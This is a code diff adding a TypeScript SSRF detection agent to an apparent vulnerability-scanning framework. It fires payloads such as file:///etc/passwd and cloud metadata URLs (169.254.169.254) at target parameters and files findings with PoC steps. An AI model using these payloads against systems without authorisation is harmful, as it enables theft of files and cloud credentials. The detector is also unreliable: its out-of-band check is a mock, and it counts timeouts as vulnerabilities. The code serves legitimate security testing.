@@ -1,0 +1,348 @@
+/**
+ * SSRF Detection Agent
+ * Detects Server-Side Request Forgery vulnerabilities
+ */
+
+import { BaseAgent } from './BaseAgent';
+import type { SSRFDetectionJob, Finding, Evidence } from '../../shared/types';
+import { v4 as uuidv4 } from 'uuid';
+import axios from 'axios';
+import { exec } from 'child_process';
+import { promisify } from 'util';
+
+const execAsync = promisify(exec);
+
+export class SSRFAgent extends BaseAgent {
+  async execute(job: SSRFDetectionJob): Promise<any> {
+    this.logger.info({ jobId: job.id }, 'Starting SSRF detection');
+
+    const findings: Finding[] = [];
+    const { targets, oobServer, payloadTypes, timeout } = job.options;
+
+    for (const target of targets) {
+      this.logger.info({ target }, 'Testing target for SSRF');
+
+      // Generate unique identifier for this test
+      const testId = uuidv4().substring(0, 8);
+      const oobUrl = `${oobServer}/${testId}`;
+
+      for (const payloadType of payloadTypes) {
+        const payloads = this.generatePayloads(payloadType, oobUrl);
+
+        for (const payload of payloads) {
+          try {
+            const result = await this.testPayload(target, payload, oobUrl, testId, timeout);
+
+            if (result.vulnerable) {
+              const finding = await this.createFinding(
+                job,
+                target,
+                payloadType,
+                payload,
+                result.evidence
+              );
+              findings.push(finding);
+
+              this.logger.info({
+                target,
+                payloadType,
+                severity: finding.severity
+              }, 'SSRF vulnerability detected');
+            }
+          } catch (error: any) {
+            this.logger.error({
+              target,
+              payload,
+              error: error.message
+            }, 'Error testing SSRF payload');
+          }
+        }
+      }
+    }
+
+    return {
+      findings,
+      summary: {
+        targetsScanned: targets.length,
+        vulnerabilitiesFound: findings.length
+      }
+    };
+  }
+
+  /**
+   * Generate SSRF payloads based on type
+   */
+  private generatePayloads(type: string, oobUrl: string): string[] {
+    const payloads: string[] = [];
+
+    switch (type) {
+      case 'url':
+        payloads.push(
+          oobUrl,
+          `http://${oobUrl}`,
+          `https://${oobUrl}`,
+          `//  ${oobUrl}`,
+          `@${oobUrl}`,
+          `http://127.0.0.1@${oobUrl}`,
+          `http://localhost@${oobUrl}`
+        );
+        break;
+
+      case 'redirect':
+        payloads.push(
+          `http://127.0.0.1?redirect=${encodeURIComponent(oobUrl)}`,
+          `http://localhost?url=${encodeURIComponent(oobUrl)}`,
+          `http://127.0.0.1?next=${encodeURIComponent(oobUrl)}`
+        );
+        break;
+
+      case 'file':
+        payloads.push(
+          'file:///etc/passwd',
+          'file:///c:/windows/win.ini',
+          'file://localhost/etc/passwd'
+        );
+        break;
+
+      case 'cloud_metadata':
+        payloads.push(
+          'http://169.254.169.254/latest/meta-data/',
+          'http://metadata.google.internal/computeMetadata/v1/',
+          'http://169.254.169.254/metadata/instance?api-version=2021-02-01'
+        );
+        break;
+    }
+
+    return payloads;
+  }
+
+  /**
+   * Test a payload for SSRF
+   */
+  private async testPayload(
+    target: string,
+    payload: string,
+    oobUrl: string,
+    testId: string,
+    timeout: number
+  ): Promise<{ vulnerable: boolean; evidence: Evidence[] }> {
+    const evidence: Evidence[] = [];
+    let vulnerable = false;
+
+    // Test with various injection points
+    const injectionPoints = [
+      { param: 'url', value: payload },
+      { param: 'redirect', value: payload },
+      { param: 'callback', value: payload },
+      { param: 'webhook', value: payload },
+      { param: 'fetch', value: payload }
+    ];
+
+    for (const injection of injectionPoints) {
+      try {
+        const testUrl = `${target}?${injection.param}=${encodeURIComponent(injection.value)}`;
+
+        // Make request
+        const startTime = Date.now();
+        const response = await axios.get(testUrl, {
+          timeout: timeout * 1000,
+          maxRedirects: 5,
+          validateStatus: () => true // Accept any status
+        });
+
+        const duration = Date.now() - startTime;
+
+        evidence.push({
+          type: 'request',
+          content: `GET ${testUrl}`,
+          metadata: {
+            param: injection.param,
+            payload: injection.value
+          },
+          timestamp: new Date()
+        });
+
+        evidence.push({
+          type: 'response',
+          content: `Status: ${response.status}\nHeaders: ${JSON.stringify(response.headers)}\nBody: ${String(response.data).substring(0, 500)}`,
+          metadata: {
+            status: response.status,
+            duration
+          },
+          timestamp: new Date()
+        });
+
+        // Check for indicators of SSRF
+        const indicators = this.checkSSRFIndicators(response.data, response.status, duration);
+
+        if (indicators.detected) {
+          vulnerable = true;
+          evidence.push({
+            type: 'log',
+            content: `SSRF indicators detected: ${indicators.reasons.join(', ')}`,
+            timestamp: new Date()
+          });
+        }
+
+        // Wait and check OOB server for callback
+        if (oobUrl.includes('http')) {
+          await this.sleep(2000); // Wait 2 seconds for callback
+
+          const oobCheck = await this.checkOOBServer(testId);
+          if (oobCheck.received) {
+            vulnerable = true;
+            evidence.push({
+              type: 'log',
+              content: `Out-of-band callback received: ${oobCheck.details}`,
+              timestamp: new Date()
+            });
+          }
+        }
+
+      } catch (error: any) {
+        // Timeout or network error might indicate SSRF
+        if (error.code === 'ECONNABORTED' || error.code === 'ETIMEDOUT') {
+          evidence.push({
+            type: 'log',
+            content: `Request timeout - possible SSRF to internal network`,
+            timestamp: new Date()
+          });
+          vulnerable = true;
+        }
+      }
+    }
+
+    return { vulnerable, evidence };
+  }
+
+  /**
+   * Check response for SSRF indicators
+   */
+  private checkSSRFIndicators(
+    body: any,
+    status: number,
+    duration: number
+  ): { detected: boolean; reasons: string[] } {
+    const reasons: string[] = [];
+
+    // Convert body to string
+    const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
+
+    // Check for cloud metadata indicators
+    if (bodyStr.includes('ami-id') || bodyStr.includes('instance-id')) {
+      reasons.push('AWS metadata detected');
+    }
+
+    if (bodyStr.includes('project-id') || bodyStr.includes('computeMetadata')) {
+      reasons.push('GCP metadata detected');
+    }
+
+    // Check for file content indicators
+    if (bodyStr.includes('root:x:0:0') || bodyStr.includes('[boot loader]')) {
+      reasons.push('Local file read detected');
+    }
+
+    // Check for internal network indicators
+    if (bodyStr.includes('127.0.0.1') || bodyStr.includes('localhost') || bodyStr.includes('192.168.')) {
+      reasons.push('Internal network reference detected');
+    }
+
+    // Suspicious long duration might indicate internal network request
+    if (duration > 5000) {
+      reasons.push('Unusually long response time');
+    }
+
+    return {
+      detected: reasons.length > 0,
+      reasons
+    };
+  }
+
+  /**
+   * Check OOB server for callbacks
+   */
+  private async checkOOBServer(testId: string): Promise<{ received: boolean; details?: string }> {
+    // This would integrate with interact.sh or similar OOB service
+    // For now, return mock implementation
+    return { received: false };
+  }
+
+  /**
+   * Create finding from SSRF detection
+   */
+  private async createFinding(
+    job: SSRFDetectionJob,
+    target: string,
+    payloadType: string,
+    payload: string,
+    evidence: Evidence[]
+  ): Promise<Finding> {
+    const severity = this.calculateSeverity(payloadType);
+
+    return {
+      id: uuidv4(),
+      programId: job.programId,
+      assetId: '', // Would be populated by orchestrator
+      severity,
+      confidence: 0.8,
+      title: `Server-Side Request Forgery (SSRF) - ${payloadType}`,
+      description: `A Server-Side Request Forgery vulnerability was detected in ${target}. The application accepts user-supplied URLs and makes server-side requests without proper validation.`,
+      cwe: ['CWE-918'],
+      evidence,
+      poc: {
+        steps: [
+          'Send a request to the vulnerable endpoint with a malicious URL',
+          `Use payload: ${payload}`,
+          'Observe the server making a request to the attacker-controlled URL or internal resource'
+        ],
+        payload,
+        reproductionRate: 0.9
+      },
+      impact: this.generateImpact(payloadType),
+      remediation: `Implement strict input validation and whitelist allowed protocols and domains. Use a deny-list approach for internal IP ranges. Consider using a dedicated service for URL fetching with network isolation.`,
+      status: 'new',
+      confirmations: [],
+      createdAt: new Date(),
+      updatedAt: new Date()
+    };
+  }
+
+  /**
+   * Calculate severity based on payload type
+   */
+  private calculateSeverity(payloadType: string): 'critical' | 'high' | 'medium' | 'low' | 'info' {
+    switch (payloadType) {
+      case 'cloud_metadata':
+        return 'critical';
+      case 'file':
+        return 'high';
+      case 'url':
+        return 'high';
+      case 'redirect':
+        return 'medium';
+      default:
+        return 'medium';
+    }
+  }
+
+  /**
+   * Generate impact description
+   */
+  private generateImpact(payloadType: string): string {
+    const impacts: Record<string, string> = {
+      cloud_metadata: 'An attacker can access cloud metadata endpoints to retrieve sensitive information such as IAM credentials, API keys, and instance configuration. This can lead to full cloud account compromise.',
+      file: 'An attacker can read arbitrary files from the server filesystem, potentially accessing configuration files, credentials, source code, and other sensitive data.',
+      url: 'An attacker can make the server perform requests to internal network resources, potentially bypassing firewalls and accessing internal services not exposed to the internet.',
+      redirect: 'An attacker can abuse the server as a proxy to perform port scanning, bypass IP-based access controls, and access internal resources.'
+    };
+
+    return impacts[payloadType] || 'An attacker can manipulate server-side requests to access unintended resources.';
+  }
+
+  /**
+   * Helper: Sleep
+   */
+  private sleep(ms: number): Promise<void> {
+    return new Promise(resolve => setTimeout(resolve, ms));
+  }
+}
